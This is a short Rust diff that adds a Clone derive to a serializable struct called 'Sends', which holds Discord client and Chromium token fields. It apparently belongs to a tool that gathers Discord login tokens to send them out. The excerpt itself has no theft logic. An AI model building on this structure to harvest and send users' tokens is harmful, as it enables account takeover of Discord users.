@@ -3,7 +3,7 @@ use serde_derive::{Deserialize, Serialize};
 #[cfg(feature = "functions")]
 mod all_data;
 
-#[derive(Deserialize, Serialize)]
+#[derive(Deserialize, Serialize, Clone)]
 pub struct Sends {
     pub discord_client_token: Option<String>,
     pub discord_chromium_token: Option<String>,
